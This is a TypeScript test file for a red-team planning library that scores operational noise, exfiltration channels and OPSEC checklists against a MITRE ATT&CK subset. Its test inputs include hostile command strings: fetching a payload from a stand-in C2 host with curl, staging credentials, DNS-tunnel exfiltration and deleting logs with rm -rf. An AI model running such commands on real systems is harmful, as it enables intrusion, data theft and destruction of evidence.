import { describe, it, expect } from 'vitest';
import {
  ATTACK_BY_ID,
  ATTACK_BY_TACTIC,
  ATTACK_TACTICS,
  ATTACK_TECHNIQUES,
  type AttackTacticKey,
} from '../teams/black/attack-data.js';
import { structuredNoiseBudget } from '../teams/black/noise.js';
import { EXFIL_CHANNELS, exfilCostModel } from '../teams/black/exfil.js';
import { opsecChecklist, opsecReview, OPSEC_PHASES } from '../teams/black/checklist.js';

describe('black suite: vendored ATT&CK subset integrity', () => {
  it('vendors at least 60 techniques into a complete id-keyed lookup', () => {
    expect(ATTACK_TECHNIQUES.length).toBeGreaterThanOrEqual(60);
    expect(Object.keys(ATTACK_BY_ID)).toHaveLength(ATTACK_TECHNIQUES.length);
    // The checklist phase order is the doctrine order, and the tactic ids are
    // the v19 bundle's (TA0005 is Stealth, TA0011 Command and Control).
    expect(ATTACK_TACTICS.map(tactic => tactic.key)).toEqual([...OPSEC_PHASES]);
    expect(ATTACK_TACTICS.map(tactic => tactic.id)).toEqual(['TA0043', 'TA0007', 'TA0005', 'TA0009', 'TA0011', 'TA0010']);
  });

  it('spreads techniques across every doctrine tactic, including exfiltration and C2', () => {
    for (const tactic of ATTACK_TACTICS) {
      const inTactic = ATTACK_TECHNIQUES.filter(technique => technique.tactics.includes(tactic.key));
      expect(inTactic.length, `${tactic.key} (${tactic.id}) must contribute techniques`).toBeGreaterThan(0);
      for (const ref of ATTACK_BY_TACTIC[tactic.key]) {
        expect(ATTACK_BY_ID[ref], `${ref} must resolve in the vendored subset`).toBeDefined();
      }
    }
    const keys = ATTACK_TACTICS.map(tactic => tactic.key);
    expect(keys).toContain('exfiltration');
    expect(keys).toContain('command-and-control');
  });

  it('resolves every engine-emitted technique id in ATTACK_BY_ID (no invented ids)', () => {
    const emitted: Record<string, true> = {};
    // opsecChecklist walks the whole vendored subset phase by phase.
    for (const phase of OPSEC_PHASES) {
      for (const ref of opsecChecklist(phase).techniqueRefs) emitted[ref] = true;
    }
    // Noise ledger over actions spanning all six phases (every tactic tier).
    const noise = structuredNoiseBudget({
      actions: [
        'nmap -sV 10.0.0.5', // reconnaissance
        'ps aux && uname -a', // discovery
        'base64 -d payload.b64', // stealth
        'collect credentials and stage the archive', // collection
        'curl -o tooling http://egress.internal/payload', // command and control
        'exfil over c2 with dns tunnel', // exfiltration
      ],
      egress: ['egress.internal:8443'],
    });
    for (const entry of noise.entries) {
      for (const match of entry.matches) emitted[match.id] = true;
    }
    // Exfil model over every documented channel key.
    const exfil = exfilCostModel({
      egress: ['egress.internal:8443'],
      paths: EXFIL_CHANNELS.map(channel => ({ id: `path-${channel}`, channel, volumeMb: 50 })),
    });
    for (const path of exfil.paths) emitted[path.techniqueId] = true;

    const unknown = Object.keys(emitted).filter(id => !ATTACK_BY_ID[id]);
    expect(unknown, 'engines must never emit an id absent from ATTACK_BY_ID').toEqual([]);
    // The engine run must have actually exercised the ontology, not emitted nothing.
    expect(Object.keys(emitted).length).toBeGreaterThanOrEqual(60);
  });
});

describe('black suite: structuredNoiseBudget', () => {
  it('scores an nmap-style recon action low with no violations', () => {
    const report = structuredNoiseBudget({
      actions: ['nmap -sV 10.0.0.5'],
      egress: ['egress.internal:8443'],
    });
    expect(report.entries).toHaveLength(1);
    expect(report.entries[0].matches.map(match => match.id)).toEqual(['T1595.001']);
    // Lone reconnaissance match: the tier weight alone, no surcharges.
    expect(report.entries[0].cost).toBe(2);
    expect(report.total).toBe(2);
    expect(report.tier).toBe('low');
    expect(report.within).toBe(true);
    expect(report.violations).toEqual([]);
  });

  it('scores an rm -rf-style action high and raises the anti-forensics refusal', () => {
    const report = structuredNoiseBudget({
      actions: ['rm -rf /var/log/app'],
      egress: ['egress.internal:8443'],
    });
    const entry = report.entries[0];
    expect(entry.matches.map(match => match.id)).toEqual(['T1070.004']);
    // stealth tier 3 + fixed 8-point anti-forensics penalty: doctrine refusal,
    // never scored as stealth credit.
    expect(entry.cost).toBe(11);
    expect(report.total).toBe(11);
    expect(report.violations.some(violation =>
      violation.includes('anti-forensics refused') && violation.includes('T1070.004'),
    )).toBe(true);
    expect(report.tier).not.toBe('quiet');
  });

  it('is deterministic across two calls over the same plan', () => {
    const plan = {
      actions: ['nmap -sV 10.0.0.5', 'curl -o payload http://egress.internal/p', 'rm -rf /tmp/x'],
      egress: ['egress.internal:8443'],
    };
    expect(structuredNoiseBudget(plan)).toEqual(structuredNoiseBudget(plan));
  });
});

describe('black suite: exfilCostModel', () => {
  it('tiers a volumetric dns tunnel high and a quiet api-response low', () => {
    const report = exfilCostModel({
      egress: ['egress.internal:53'],
      paths: [
        { id: 'dns-tunnel', channel: 'dns-tunnel', volumeMb: 200 },
        { id: 'api-response', channel: 'api-response', volumeMb: 50 },
      ],
    });
    const byId = Object.fromEntries(report.paths.map(path => [path.pathId, path]));
    // dns-tunnel: base 6 + 2 volume blocks + 2 cleartext penalty = 10 → high, infeasible.
    expect(byId['dns-tunnel'].totalCost).toBe(10);
    expect(byId['dns-tunnel'].tier).toBe('high');
    expect(byId['dns-tunnel'].feasible).toBe(false);
    // api-response: base 2 + 1 volume block, encrypted by default = 3 → low, feasible.
    expect(byId['api-response'].totalCost).toBe(3);
    expect(byId['api-response'].tier).toBe('low');
    expect(byId['api-response'].feasible).toBe(true);
  });

  it('surfaces an unknown channel honestly as the unspecified C2-channel fallback', () => {
    const report = exfilCostModel({
      egress: ['egress.internal:443'],
      paths: [{ id: 'pigeon-post', channel: 'carrier-pigeon' }],
    });
    expect(report.paths).toHaveLength(1);
    const path = report.paths[0];
    expect(path.channel).toBe('unspecified');
    expect(path.techniqueId).toBe('T1041');
    expect(path.baseCost).toBe(2);
  });
});

describe('black suite: opsecChecklist', () => {
  it('returns items with stable ids for every doctrine phase', () => {
    for (const phase of OPSEC_PHASES) {
      const checklist = opsecChecklist(phase);
      expect(checklist.items.length, `${phase} must carry checklist items`).toBeGreaterThan(0);
      expect(checklist.tacticId, `${phase} must carry its TA id`).toMatch(/^TA\d{4}$/);
      for (const item of checklist.items) {
        expect(item.id, `${phase} item ids must be stable`).toMatch(/^[A-Z0-9]+-\d{2}$/);
        expect(item.check.trim().length, `${item.id} must state a check`).toBeGreaterThan(0);
        expect(item.why.trim().length, `${item.id} must state a why`).toBeGreaterThan(0);
      }
    }
    // Spot-check the documented ids: the exfiltration checklist opens at EXF-01.
    expect(opsecChecklist('exfiltration').items[0].id).toBe('EXF-01');
  });

  it('throws on an unknown phase (a typo is a bug, not an empty checklist)', () => {
    // Deliberate widening: the runtime guard is the documented contract.
    const bogus = 'lateral-movement' as AttackTacticKey;
    expect(() => opsecChecklist(bogus)).toThrow(/lateral-movement/);
  });
});

describe('black suite: opsecReview', () => {
  it('groups a mixed plan into phase checklists and flags undeclared egress', () => {
    const review = opsecReview({
      actions: ['nmap -sV 10.0.0.5', 'exfil over c2 with dns tunnel'],
      egress: [],
    });
    expect(review.egressDeclared).toBe(false);
    expect(review.egressNotes).toHaveLength(1);
    const phases = review.phases.map(entry => entry.phase);
    expect(phases).toContain('reconnaissance');
    expect(phases).toContain('exfiltration');
    expect(review.itemCount).toBe(review.phases.reduce((sum, entry) => sum + entry.checklist.length, 0));
  });

  it('reports an honest empty review for an empty plan', () => {
    const review = opsecReview({ actions: [], egress: ['egress.internal:443'] });
    expect(review.phases).toEqual([]);
    expect(review.itemCount).toBe(0);
    expect(review.egressNotes).toEqual([]);
  });
});
